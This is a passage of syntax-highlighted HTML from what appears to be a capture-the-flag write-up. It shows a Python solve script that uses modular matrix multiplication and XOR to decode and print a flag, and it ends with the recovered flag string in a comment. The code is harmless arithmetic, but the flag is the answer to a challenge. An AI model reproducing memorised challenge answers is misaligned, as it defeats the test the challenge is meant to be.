<span class="line"><span style="color:var(--astro-code-color-text)">            MA </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MA)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        elif</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            MA </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MA)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        elif</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            MA </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MA)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        elif</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 2</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            MA </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MA)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    v </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">3</span><span style="color:var(--astro-code-token-punctuation)">])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    v </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(MA, v)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    var19</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> var20</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> var21 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> v</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    var23 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> var12</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">var14</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-token-keyword)"> ^</span><span style="color:var(--astro-code-color-text)"> (var19 </span><span style="color:var(--astro-code-token-keyword)">&#x26;</span><span style="color:var(--astro-code-token-constant)"> 255</span><span style="color:var(--astro-code-color-text)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">    print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">chr</span><span style="color:var(--astro-code-token-punctuation)">(var23), end</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">""</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    sys</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">stdout</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">flush</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># bctf{we1rd_pyth0nc0d3_so1v3_w1th_f4s7_M47r1x_Mu1t}</span></span>
<span class="line"></span></code></pre> </div>  </div> </body></html>